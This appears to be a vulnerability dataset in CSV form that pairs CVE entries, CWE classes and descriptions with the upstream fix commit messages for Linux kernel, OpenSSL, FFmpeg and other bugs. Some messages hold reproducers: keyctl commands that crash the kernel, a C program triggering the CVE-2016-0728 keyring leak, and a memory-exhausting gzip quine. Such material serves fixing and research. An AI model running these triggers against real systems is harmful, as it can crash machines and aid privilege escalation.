CVE-2017-17712,CWE-362,2017-12-16,The raw_sendmsg() function in net/ipv4/raw.c in the Linux kernel through 4.14.6 has a race condition in inet->hdrincl that leads to uninitialized stack pointer usage; this allows a local user to execute code and gain privileges.,"inet->hdrincl is racy, and could lead to uninitialized stack pointer usage, so its value should be read only once.  Fixes: c008ba5 (""ipv4: Avoid reading user iov twice after raw_probe_proto_opt"") Signed-off-by: Mohamed Ghannam <simo.ghannam@gmail.com> Reviewed-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-1549,CWE-330,2019-09-10,OpenSSL 1.1.1 introduced a rewritten random number generator (RNG). This was intended to include protection in the event of a fork() system call in order to ensure that the parent and child processes did not share the same RNG state. However this protection was not being used in the default case. A partial mitigation for this issue is that the output from a high precision timer is mixed into the RNG state so the likelihood of a parent and child process sharing state is significantly reduced. If an application already calls OPENSSL_init_crypto() explicitly using OPENSSL_INIT_ATFORK then this problem does not occur at all. Fixed in OpenSSL 1.1.1d (Affected 1.1.1-1.1.1c).,
CVE-2014-2013,CWE-119,2014-03-03,Stack-based buffer overflow in the xps_parse_color function in xps/xps-common.c in MuPDF 1.3 and earlier allows remote attackers to execute arbitrary code via a large number of entries in the ContextColor value of the Fill attribute in a Path element.,
CVE-2014-9731,CWE-17,2015-08-31,"The UDF filesystem implementation in the Linux kernel before 3.18.2 does not ensure that space is available for storing a symlink target's name along with a trailing \0 character, which allows local users to obtain sensitive information via a crafted filesystem image, related to fs/udf/symlink.c and fs/udf/unicode.c.",Symlink reading code does not check whether the resulting path fits into the page provided by the generic code. This isn't as easy as just checking the symlink size because of various encoding conversions we perform on path. So we have to check whether there is still enough space in the buffer on the fly.  CC: stable@vger.kernel.org Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no> Signed-off-by: Jan Kara <jack@suse.cz>
CVE-2011-2182,CWE-119,2012-06-13,"The ldm_frag_add function in fs/partitions/ldm.c in the Linux kernel before 2.6.39.1 does not properly handle memory allocation for non-initial fragments, which might allow local users to conduct buffer overflow attacks, and gain privileges or obtain sensitive information, via a crafted LDM partition table.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-1017.",
CVE-2015-3281,CWE-119,2015-07-06,"The buffer_slow_realign function in HAProxy 1.5.x before 1.5.14 and 1.6-dev does not properly realign a buffer that is used for pending outgoing data, which allows remote attackers to obtain sensitive information (uninitialized memory contents of previous requests) via a crafted request.",
CVE-2017-18232,,2018-03-15,"The Serial Attached SCSI (SAS) implementation in the Linux kernel through 4.15.9 mishandles a mutex within libsas, which allows local users to cause a denial of service (deadlock) by triggering certain error-handling code.","In commit 87c8331 (""[SCSI] libsas: prevent domain rediscovery competing with ata error handling"") introduced disco mutex to prevent rediscovery competing with ata error handling and put the whole revalidation in the mutex. But the rphy add/remove needs to wait for the error handling which also grabs the disco mutex. This may leads to dead lock.So the probe and destruct event were introduce to do the rphy add/remove asynchronously and out of the lock.  The asynchronously processed workers makes the whole discovery process not atomic, the other events may interrupt the process. For example, if a loss of signal event inserted before the probe event, the sas_deform_port() is called and the port will be deleted.  And sas_port_delete() may run before the destruct event, but the port-x:x is the top parent of end device or expander. This leads to a kernel WARNING such as:  [   82.042979] sysfs group 'power' not found for kobject 'phy-1:0:22' [   82.042983] ------------[ cut here ]------------ [   82.042986] WARNING: CPU: 54 PID: 1714 at fs/sysfs/group.c:237 sysfs_remove_group+0x94/0xa0 [   82.043059] Call trace: [   82.043082] [<ffff0000082e7624>] sysfs_remove_group+0x94/0xa0 [   82.043085] [<ffff00000864e320>] dpm_sysfs_remove+0x60/0x70 [   82.043086] [<ffff00000863ee10>] device_del+0x138/0x308 [   82.043089] [<ffff00000869a2d0>] sas_phy_delete+0x38/0x60 [   82.043091] [<ffff00000869a86c>] do_sas_phy_delete+0x6c/0x80 [   82.043093] [<ffff00000863dc20>] device_for_each_child+0x58/0xa0 [   82.043095] [<ffff000008696f80>] sas_remove_children+0x40/0x50 [   82.043100] [<ffff00000869d1bc>] sas_destruct_devices+0x64/0xa0 [   82.043102] [<ffff0000080e93bc>] process_one_work+0x1fc/0x4b0 [   82.043104] [<ffff0000080e96c0>] worker_thread+0x50/0x490 [   82.043105] [<ffff0000080f0364>] kthread+0xfc/0x128 [   82.043107] [<ffff0000080836c0>] ret_from_fork+0x10/0x50  Make probe and destruct a direct call in the disco and revalidate function, but put them outside the lock. The whole discovery or revalidate won't be interrupted by other events. And the DISCE_PROBE and DISCE_DESTRUCT event are deleted as a result of the direct call.  Introduce a new list to destruct the sas_port and put the port delete after the destruct. This makes sure the right order of destroying the sysfs kobject and fix the warning above.  In sas_ex_revalidate_domain() have a loop to find all broadcasted device, and sometimes we have a chance to find the same expander twice. Because the sas_port will be deleted at the end of the whole revalidate process, sas_port with the same name cannot be added before this. Otherwise the sysfs will complain of creating duplicate filename. Since the LLDD will send broadcast for every device change, we can only process one expander's revalidation.  [mkp: kbuild test robot warning]  Signed-off-by: Jason Yan <yanaijie@huawei.com> CC: John Garry <john.garry@huawei.com> CC: Johannes Thumshirn <jthumshirn@suse.de> CC: Ewan Milne <emilne@redhat.com> CC: Christoph Hellwig <hch@lst.de> CC: Tomas Henzl <thenzl@redhat.com> CC: Dan Williams <dan.j.williams@intel.com> Reviewed-by: Hannes Reinecke <hare@suse.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>"
CVE-2016-4470,,2016-06-27,"The key_reject_and_link function in security/keys/key.c in the Linux kernel through 4.6.3 does not ensure that a certain data structure is initialized, which allows local users to cause a denial of service (system crash) via vectors involving a crafted keyctl request2 command.","If __key_link_begin() failed then ""edit"" would be uninitialized.  I've added a check to fix that.  This allows a random user to crash the kernel, though it's quite difficult to achieve.  There are three ways it can be done as the user would have to cause an error to occur in __key_link():   (1) Cause the kernel to run out of memory.  In practice, this is difficult      to achieve without ENOMEM cropping up elsewhere and aborting the      attempt.   (2) Revoke the destination keyring between the keyring ID being looked up      and it being tested for revocation.  In practice, this is difficult to      time correctly because the KEYCTL_REJECT function can only be used      from the request-key upcall process.  Further, users can only make use      of what's in /sbin/request-key.conf, though this does including a      rejection debugging test - which means that the destination keyring      has to be the caller's session keyring in practice.   (3) Have just enough key quota available to create a key, a new session      keyring for the upcall and a link in the session keyring, but not then      sufficient quota to create a link in the nominated destination keyring      so that it fails with EDQUOT.  The bug can be triggered using option (3) above using something like the following:  	echo 80 >/proc/sys/kernel/keys/root_maxbytes 	keyctl request2 user debug:fred negate @t  The above sets the quota to something much lower (80) to make the bug easier to trigger, but this is dependent on the system.  Note also that the name of the keyring created contains a random number that may be between 1 and 10 characters in size, so may throw the test off by changing the amount of quota used.  Assuming the failure occurs, something like the following will be seen:  	kfree_debugcheck: out of range ptr 6b6b6b6b6b6b6b68h 	------------[ cut here ]------------ 	kernel BUG at ../mm/slab.c:2821! 	... 	RIP: 0010:[<ffffffff811600f9>] kfree_debugcheck+0x20/0x25 	RSP: 0018:ffff8804014a7de8  EFLAGS: 00010092 	RAX: 0000000000000034 RBX: 6b6b6b6b6b6b6b68 RCX: 0000000000000000 	RDX: 0000000000040001 RSI: 00000000000000f6 RDI: 0000000000000300 	RBP: ffff8804014a7df0 R08: 0000000000000001 R09: 0000000000000000 	R10: ffff8804014a7e68 R11: 0000000000000054 R12: 0000000000000202 	R13: ffffffff81318a66 R14: 0000000000000000 R15: 0000000000000001 	... 	Call Trace: 	  kfree+0xde/0x1bc 	  assoc_array_cancel_edit+0x1f/0x36 	  __key_link_end+0x55/0x63 	  key_reject_and_link+0x124/0x155 	  keyctl_reject_key+0xb6/0xe0 	  keyctl_negate_key+0x10/0x12 	  SyS_keyctl+0x9f/0xe7 	  do_syscall_64+0x63/0x13a 	  entry_SYSCALL64_slow_path+0x25/0x25  Fixes: f70e2e0 ('KEYS: Do preallocation for __key_link()') Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: David Howells <dhowells@redhat.com> cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-18232,,2018-03-15,"The Serial Attached SCSI (SAS) implementation in the Linux kernel through 4.15.9 mishandles a mutex within libsas, which allows local users to cause a denial of service (deadlock) by triggering certain error-handling code.","In commit 87c8331 (""[SCSI] libsas: prevent domain rediscovery competing with ata error handling"") introduced disco mutex to prevent rediscovery competing with ata error handling and put the whole revalidation in the mutex. But the rphy add/remove needs to wait for the error handling which also grabs the disco mutex. This may leads to dead lock.So the probe and destruct event were introduce to do the rphy add/remove asynchronously and out of the lock.  The asynchronously processed workers makes the whole discovery process not atomic, the other events may interrupt the process. For example, if a loss of signal event inserted before the probe event, the sas_deform_port() is called and the port will be deleted.  And sas_port_delete() may run before the destruct event, but the port-x:x is the top parent of end device or expander. This leads to a kernel WARNING such as:  [   82.042979] sysfs group 'power' not found for kobject 'phy-1:0:22' [   82.042983] ------------[ cut here ]------------ [   82.042986] WARNING: CPU: 54 PID: 1714 at fs/sysfs/group.c:237 sysfs_remove_group+0x94/0xa0 [   82.043059] Call trace: [   82.043082] [<ffff0000082e7624>] sysfs_remove_group+0x94/0xa0 [   82.043085] [<ffff00000864e320>] dpm_sysfs_remove+0x60/0x70 [   82.043086] [<ffff00000863ee10>] device_del+0x138/0x308 [   82.043089] [<ffff00000869a2d0>] sas_phy_delete+0x38/0x60 [   82.043091] [<ffff00000869a86c>] do_sas_phy_delete+0x6c/0x80 [   82.043093] [<ffff00000863dc20>] device_for_each_child+0x58/0xa0 [   82.043095] [<ffff000008696f80>] sas_remove_children+0x40/0x50 [   82.043100] [<ffff00000869d1bc>] sas_destruct_devices+0x64/0xa0 [   82.043102] [<ffff0000080e93bc>] process_one_work+0x1fc/0x4b0 [   82.043104] [<ffff0000080e96c0>] worker_thread+0x50/0x490 [   82.043105] [<ffff0000080f0364>] kthread+0xfc/0x128 [   82.043107] [<ffff0000080836c0>] ret_from_fork+0x10/0x50  Make probe and destruct a direct call in the disco and revalidate function, but put them outside the lock. The whole discovery or revalidate won't be interrupted by other events. And the DISCE_PROBE and DISCE_DESTRUCT event are deleted as a result of the direct call.  Introduce a new list to destruct the sas_port and put the port delete after the destruct. This makes sure the right order of destroying the sysfs kobject and fix the warning above.  In sas_ex_revalidate_domain() have a loop to find all broadcasted device, and sometimes we have a chance to find the same expander twice. Because the sas_port will be deleted at the end of the whole revalidate process, sas_port with the same name cannot be added before this. Otherwise the sysfs will complain of creating duplicate filename. Since the LLDD will send broadcast for every device change, we can only process one expander's revalidation.  [mkp: kbuild test robot warning]  Signed-off-by: Jason Yan <yanaijie@huawei.com> CC: John Garry <john.garry@huawei.com> CC: Johannes Thumshirn <jthumshirn@suse.de> CC: Ewan Milne <emilne@redhat.com> CC: Christoph Hellwig <hch@lst.de> CC: Tomas Henzl <thenzl@redhat.com> CC: Dan Williams <dan.j.williams@intel.com> Reviewed-by: Hannes Reinecke <hare@suse.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>"
CVE-2016-7166,CWE-399,2016-09-21,"libarchive before 3.2.0 does not limit the number of recursive decompressions, which allows remote attackers to cause a denial of service (memory consumption and application crash) via a crafted gzip file.","It seems bsdtar automatically handles stacked compression. This is a nice feature but it could be problematic when it's completely unlimited.  Most clearly it's illustrated with quines:  $ curl -sRO http://www.maximumcompression.com/selfgz.gz $ (ulimit -v 10000000 && bsdtar -tvf selfgz.gz) bsdtar: Error opening archive: Can't allocate data for gzip decompression  Without ulimit, bsdtar will eat all available memory. This could also be a problem for other applications using libarchive."
CVE-2018-11384,CWE-125,2018-05-22,The sh_op() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted ELF file.,
CVE-2018-20542,CWE-119,2018-12-28,"There is a heap-based buffer-overflow at generator_spgemm_csc_reader.c (function libxsmm_sparse_csc_reader) in LIBXSMM 1.10, a different vulnerability than CVE-2018-20541 (which is in a different part of the source code and is seen at a different address).",
CVE-2013-4515,CWE-200,2013-11-12,"The bcm_char_ioctl function in drivers/staging/bcm/Bcmchar.c in the Linux kernel before 3.12 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel memory via an IOCTL_BCM_GET_DEVICE_DRIVER_INFO ioctl call.",The DevInfo.u32Reserved[] array isn't initialized so it leaks kernel information to user space.  Reported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2016-7917,CWE-125,2016-11-16,"The nfnetlink_rcv_batch function in net/netfilter/nfnetlink.c in the Linux kernel before 4.5 does not check whether a batch message's length field is large enough, which allows local users to obtain sensitive information from kernel memory or cause a denial of service (infinite loop or out-of-bounds read) by leveraging the CAP_NET_ADMIN capability.","If nlh->nlmsg_len is zero then an infinite loop is triggered because 'skb_pull(skb, msglen);' pulls zero bytes.  The calculation in nlmsg_len() underflows if 'nlh->nlmsg_len < NLMSG_HDRLEN' which bypasses the length validation and will later trigger an out-of-bound read.  If the length validation does fail then the malformed batch message is copied back to userspace. However, we cannot do this because the nlh->nlmsg_len can be invalid. This leads to an out-of-bounds read in netlink_ack:      [   41.455421] ==================================================================     [   41.456431] BUG: KASAN: slab-out-of-bounds in memcpy+0x1d/0x40 at addr ffff880119e79340     [   41.456431] Read of size 4294967280 by task a.out/987     [   41.456431] =============================================================================     [   41.456431] BUG kmalloc-512 (Not tainted): kasan: bad access detected     [   41.456431] -----------------------------------------------------------------------------     ...     [   41.456431] Bytes b4 ffff880119e79310: 00 00 00 00 d5 03 00 00 b0 fb fe ff 00 00 00 00  ................     [   41.456431] Object ffff880119e79320: 20 00 00 00 10 00 05 00 00 00 00 00 00 00 00 00   ...............     [   41.456431] Object ffff880119e79330: 14 00 0a 00 01 03 fc 40 45 56 11 22 33 10 00 05  .......@ev.""3...     [   41.456431] Object ffff880119e79340: f0 ff ff ff 88 99 aa bb 00 14 00 0a 00 06 fe fb  ................                                             ^^ start of batch nlmsg with                                                nlmsg_len=4294967280     ...     [   41.456431] Memory state around the buggy address:     [   41.456431]  ffff880119e79400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00     [   41.456431]  ffff880119e79480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00     [   41.456431] >ffff880119e79500: 00 00 00 00 fc fc fc fc fc fc fc fc fc fc fc fc     [   41.456431]                                ^     [   41.456431]  ffff880119e79580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc     [   41.456431]  ffff880119e79600: fc fc fc fc fc fc fc fc fc fc fb fb fb fb fb fb     [   41.456431] ==================================================================  Fix this with better validation of nlh->nlmsg_len and by setting NFNL_BATCH_FAILURE if any batch message fails length validation.  CAP_NET_ADMIN is required to trigger the bugs.  Fixes: 9ea2aa8 (""netfilter: nfnetlink: validate nfnetlink header from batch"") Signed-off-by: Phil Turnbull <phil.turnbull@oracle.com> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2016-5691,CWE-20,2016-12-13,"The DCM reader in ImageMagick before 6.9.4-5 and 7.x before 7.0.1-7 allows remote attackers to have unspecified impact by leveraging lack of validation of (1) pixel.red, (2) pixel.green, and (3) pixel.blue.",
CVE-2016-10200,CWE-264,2017-03-07,"Race condition in the L2TPv3 IP Encapsulation feature in the Linux kernel before 4.8.14 allows local users to gain privileges or cause a denial of service (use-after-free) by making multiple bind system calls without properly ascertaining whether a socket has the SOCK_ZAPPED status, related to net/l2tp/l2tp_ip.c and net/l2tp/l2tp_ip6.c.",
CVE-2018-13094,CWE-476,2018-07-03,An issue was discovered in fs/xfs/libxfs/xfs_attr_leaf.c in the Linux kernel through 4.17.3. An OOPS may occur for a corrupted xfs image after xfs_da_shrink_inode() is called with a NULL bp.,"xfs_attr3_leaf_create may have errored out before instantiating a buffer, for example if the blkno is out of range.  In that case there is no work to do to remove it, and in fact xfs_da_shrink_inode will lead to an oops if we try.  This also seems to fix a flaw where the original error from xfs_attr3_leaf_create gets overwritten in the cleanup case, and it removes a pointless assignment to bp which isn't used after this.  Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=199969 Reported-by: Xu, Wen <wen.xu@gatech.edu> Tested-by: Xu, Wen <wen.xu@gatech.edu> Signed-off-by: Eric Sandeen <sandeen@redhat.com> Reviewed-by: Darrick J. Wong <darrick.wong@oracle.com> Signed-off-by: Darrick J. Wong <darrick.wong@oracle.com>"
CVE-2017-12847,CWE-665,2017-08-23,"Nagios Core before 4.3.3 creates a nagios.lock PID file after dropping privileges to a non-root account, which might allow local users to kill arbitrary processes by leveraging access to this non-root account for nagios.lock modification before a root script executes a ""kill `cat /pathname/nagios.lock`"" command.","The previous default path for the lockfile was located in $localstatedir, which is generally writable by the nagios user. That presents a security risk, since the nagios user can delete the lockfile and replace it with another file containing the PID of a root-owned process. This commit changes the default lockfile path to /run/nagios.lock, and completes the fix for Github issue #404."
CVE-2018-13303,CWE-476,2018-07-05,"In FFmpeg 4.0.1, a missing check for failure of a call to init_get_bits8() in the avpriv_ac3_parse_header function in libavcodec/ac3_parser.c may trigger a NULL pointer dereference while converting a crafted AVI file to MPEG4, leading to a denial of service.","Fixes: null pointer dereference Fixes: ffmpeg_crash_6.avi  Found-by: Thuan Pham, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart Reviewed-by: Paul B Mahol <onemda@gmail.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2012-2686,CWE-310,2013-02-08,crypto/evp/e_aes_cbc_hmac_sha1.c in the AES-NI functionality in the TLS 1.1 and 1.2 implementations in OpenSSL 1.0.1 before 1.0.1d allows remote attackers to cause a denial of service (application crash) via crafted CBC data.,
CVE-2018-16427,CWE-125,2018-09-04,Various out of bounds reads when handling responses in OpenSC before 0.19.0-rc1 could be used by attackers able to supply crafted smartcards to potentially crash the opensc library using programs.,
CVE-2015-8467,CWE-269,2015-12-29,"The samldb_check_user_account_control_acl function in dsdb/samdb/ldb_modules/samldb.c in Samba 4.x before 4.1.22, 4.2.x before 4.2.7, and 4.3.x before 4.3.3 does not properly check for administrative privileges during creation of machine accounts, which allows remote authenticated users to bypass intended access restrictions by leveraging the existence of a domain with both a Samba DC and a Windows DC, a similar issue to CVE-2015-2535.",
CVE-2018-10021,,2018-04-11,drivers/scsi/libsas/sas_scsi_host.c in the Linux kernel before 4.16 allows local users to cause a denial of service (ata qc leak) by triggering certain failure conditions. NOTE: a third party disputes the relevance of this report because the failure can only occur for physically proximate attackers who unplug SAS Host Bus Adapter cables,"When ata device doing EH, some commands still attached with tasks are not passed to libata when abort failed or recover failed, so libata did not handle these commands. After these commands done, sas task is freed, but ata qc is not freed. This will cause ata qc leak and trigger a warning like below:  WARNING: CPU: 0 PID: 28512 at drivers/ata/libata-eh.c:4037 ata_eh_finish+0xb4/0xcc CPU: 0 PID: 28512 Comm: kworker/u32:2 Tainted: G     W  OE 4.14.0#1 ...... Call trace: [<ffff0000088b7bd0>] ata_eh_finish+0xb4/0xcc [<ffff0000088b8420>] ata_do_eh+0xc4/0xd8 [<ffff0000088b8478>] ata_std_error_handler+0x44/0x8c [<ffff0000088b8068>] ata_scsi_port_error_handler+0x480/0x694 [<ffff000008875fc4>] async_sas_ata_eh+0x4c/0x80 [<ffff0000080f6be8>] async_run_entry_fn+0x4c/0x170 [<ffff0000080ebd70>] process_one_work+0x144/0x390 [<ffff0000080ec100>] worker_thread+0x144/0x418 [<ffff0000080f2c98>] kthread+0x10c/0x138 [<ffff0000080855dc>] ret_from_fork+0x10/0x18  If ata qc leaked too many, ata tag allocation will fail and io blocked for ever.  As suggested by Dan Williams, defer ata device commands to libata and merge sas_eh_finish_cmd() with sas_eh_defer_cmd(). libata will handle ata qcs correctly after this.  Signed-off-by: Jason Yan <yanaijie@huawei.com> CC: Xiaofei Tan <tanxiaofei@huawei.com> CC: John Garry <john.garry@huawei.com> CC: Dan Williams <dan.j.williams@intel.com> Reviewed-by: Dan Williams <dan.j.williams@intel.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>"
CVE-2018-18445,CWE-125,2018-10-17,"In the Linux kernel 4.14.x, 4.15.x, 4.16.x, 4.17.x, and 4.18.x before 4.18.13, faulty computation of numeric bounds in the BPF verifier permits out-of-bounds memory accesses because adjust_scalar_min_max_vals in kernel/bpf/verifier.c mishandles 32-bit right shifts.","When I wrote commit 468f6ea (""bpf: fix 32-bit ALU op verification""), I assumed that, in order to emulate 64-bit arithmetic with 32-bit logic, it is sufficient to just truncate the output to 32 bits; and so I just moved the register size coercion that used to be at the start of the function to the end of the function.  That assumption is true for almost every op, but not for 32-bit right shifts, because those can propagate information towards the least significant bit. Fix it by always truncating inputs for 32-bit ops to 32 bits.  Also get rid of the coerce_reg_to_size() after the ALU op, since that has no effect.  Fixes: 468f6ea (""bpf: fix 32-bit ALU op verification"") Acked-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: Jann Horn <jannh@google.com> Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>"
CVE-2016-9556,CWE-119,2017-03-23,The IsPixelGray function in MagickCore/pixel-accessor.h in ImageMagick 7.0.3-8 allows remote attackers to cause a denial of service (out-of-bounds heap read) via a crafted image file.,
CVE-2017-9229,CWE-476,2017-05-24,"An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A SIGSEGV occurs in left_adjust_char_head() during regular expression compilation. Invalid handling of reg->dmax in forward_search_range() could result in an invalid pointer dereference, normally as an immediate denial-of-service condition.",
CVE-2018-11592,CWE-125,2018-05-31,Espruino before 1.98 allows attackers to cause a denial of service (application crash) with a user crafted input file via an Out-of-bounds Read during syntax parsing in which certain height validation is missing in libs/graphics/jswrap_graphics.c.,
CVE-2014-4656,CWE-190,2014-07-03,"Multiple integer overflows in sound/core/control.c in the ALSA control implementation in the Linux kernel before 3.15.2 allow local users to cause a denial of service by leveraging /dev/snd/controlCX access, related to (1) index values in the snd_ctl_add function and (2) numid values in the snd_ctl_remove_numid_conflict function.",The ALSA control code expects that the range of assigned indices to a control is continuous and does not overflow. Currently there are no checks to enforce this. If a control with a overflowing index range is created that control becomes effectively inaccessible and unremovable since snd_ctl_find_id() will not be able to find it. This patch adds a check that makes sure that controls with a overflowing index range can not be created.  Signed-off-by: Lars-Peter Clausen <lars@metafoo.de> Acked-by: Jaroslav Kysela <perex@perex.cz> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>
CVE-2017-5985,CWE-862,2017-03-14,lxc-user-nic in Linux Containers (LXC) allows local users with a lxc-usernet allocation to create network interfaces on the host and choose the name of those interfaces by leveraging lack of netns ownership check.,"Before this commit, lxc-user-nic could potentially have been tricked into operating on a network namespace over which the caller did not hold privilege.  This commit ensures that the caller is privileged over the network namespace by temporarily dropping privilege.  Launchpad: https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1654676 Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Christian Brauner <christian.brauner@ubuntu.com>"
CVE-2017-7524,CWE-522,2017-06-27,tpm2-tools versions before 1.1.1 are vulnerable to a password leak due to transmitting password in plaintext from client to server when generating HMAC.,"While not reachable in the current code base tools, a potential security bug lurked in tpm_kdfa().  If using that routine for an hmac authorization, the hmac was calculated using the tpm. A user of an object wishing to authenticate via hmac, would expect that the password is never sent to the tpm. However, since the hmac calculation relies on password, and is performed by the tpm, the password ends up being sent in plain text to the tpm.  The fix is to use openssl to generate the hmac on the host.  Fixes: CVE-2017-7524  Signed-off-by: William Roberts <william.c.roberts@intel.com>"
CVE-2017-13031,CWE-125,2017-09-14,The IPv6 fragmentation header parser in tcpdump before 4.9.2 has a buffer over-read in print-frag6.c:frag6_print().,"This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture.  Clean up some whitespace in tests/TESTLIST while we're at it."
CVE-2013-7024,CWE-119,2013-12-09,"The jpeg2000_decode_tile function in libavcodec/jpeg2000dec.c in FFmpeg before 2.1 does not consider the component number in certain calculations, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted JPEG2000 data.",Fixes Ticket2921  Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2012-6547,CWE-200,2013-03-15,"The __tun_chr_ioctl function in drivers/net/tun.c in the Linux kernel before 3.6 does not initialize a certain structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.",The tun module leaks up to 36 bytes of memory by not fully initializing a structure located on the stack that gets copied to user memory by the TUNGETIFF and SIOCGIFHWADDR ioctl()s.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2018-15910,CWE-704,2018-08-27,"In Artifex Ghostscript before 9.24, attackers able to supply crafted PostScript files could use a type confusion in the LockDistillerParams parameter to crash the interpreter or execute code.",
CVE-2016-0823,CWE-200,2016-03-12,"The pagemap_open function in fs/proc/task_mmu.c in the Linux kernel before 3.19.3, as used in Android 6.0.1 before 2016-03-01, allows local users to obtain sensitive physical-address information by reading a pagemap file, aka Android internal bug 25739721.","As pointed by recent post[1] on exploiting DRAM physical imperfection, /proc/PID/pagemap exposes sensitive information which can be used to do attacks.  This disallows anybody without CAP_SYS_ADMIN to read the pagemap.  [1] http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html  [ Eventually we might want to do anything more finegrained, but for now   this is the simple model.   - Linus ]  Signed-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com> Acked-by: Konstantin Khlebnikov <khlebnikov@openvz.org> Acked-by: Andy Lutomirski <luto@amacapital.net> Cc: Pavel Emelyanov <xemul@parallels.com> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Mark Seaborn <mseaborn@chromium.org> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2012-6712,CWE-119,2019-07-27,"In the Linux kernel before 3.4, a buffer overflow occurs in drivers/net/wireless/iwlwifi/iwl-agn-sta.c, which will cause at least memory corruption.","On my testing, I saw some strange behavior  [  421.739708] iwlwifi 0000:01:00.0: ACTIVATE a non DRIVER active station id 148 addr 00:00:00:00:00:00 [  421.739719] iwlwifi 0000:01:00.0: iwl_sta_ucode_activate Added STA id 148 addr 00:00:00:00:00:00 to uCode  not sure how it happen, but adding the sanity check to prevent memory corruption  Signed-off-by: Wey-Yi Guy <wey-yi.w.guy@intel.com> Signed-off-by: John W. Linville <linville@tuxdriver.com>"
CVE-2016-0728,,2016-02-08,"The join_session_keyring function in security/keys/process_keys.c in the Linux kernel before 4.4.1 mishandles object references in a certain error case, which allows local users to gain privileges or cause a denial of service (integer overflow and use-after-free) via crafted keyctl commands.","This fixes CVE-2016-0728.  If a thread is asked to join as a session keyring the keyring that's already set as its session, we leak a keyring reference.  This can be tested with the following program:  	#include <stddef.h> 	#include <stdio.h> 	#include <sys/types.h> 	#include <keyutils.h>  	int main(int argc, const char *argv[]) 	{ 		int i = 0; 		key_serial_t serial;  		serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, 				""leaked-keyring""); 		if (serial < 0) { 			perror(""keyctl""); 			return -1; 		}  		if (keyctl(KEYCTL_SETPERM, serial, 			   KEY_POS_ALL | KEY_USR_ALL) < 0) { 			perror(""keyctl""); 			return -1; 		}  		for (i = 0; i < 100; i++) { 			serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, 					""leaked-keyring""); 			if (serial < 0) { 				perror(""keyctl""); 				return -1; 			} 		}  		return 0; 	}  If, after the program has run, there something like the following line in /proc/keys:  3f3d898f I--Q---   100 perm 3f3f0000     0     0 keyring   leaked-keyring: empty  with a usage count of 100 * the number of times the program has been run, then the kernel is malfunctioning.  If leaked-keyring has zero usages or has been garbage collected, then the problem is fixed.  Reported-by: Yevgeny Pats <yevgeny@perception-point.io> Signed-off-by: David Howells <dhowells@redhat.com> Acked-by: Don Zickus <dzickus@redhat.com> Acked-by: Prarit Bhargava <prarit@redhat.com> Acked-by: Jarod Wilson <jarod@redhat.com> Signed-off-by: James Morris <james.l.morris@oracle.com>"
CVE-2016-9843,,2017-05-23,The crc32_big function in crc32.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact via vectors involving big-endian CRC calculation.,"There was a small optimization for PowerPCs to pre-increment a pointer when accessing a word, instead of post-incrementing. This required prefacing the loop with a decrement of the pointer, possibly pointing before the object passed. This is not compliant with the C standard, for which decrementing a pointer before its allocated memory is undefined. When tested on a modern PowerPC with a modern compiler, the optimization no longer has any effect. Due to all that, and per the recommendation of a security audit of the zlib code by Trail of Bits and TrustInSoft, in support of the Mozilla Foundation, this ""optimization"" was removed, in order to avoid the possibility of undefined behavior."
CVE-2018-11595,CWE-119,2018-05-31,"Espruino before 1.99 allows attackers to cause a denial of service (application crash) and a potential Escalation of Privileges with a user crafted input file via a Buffer Overflow during syntax parsing, because strncat is misused.",
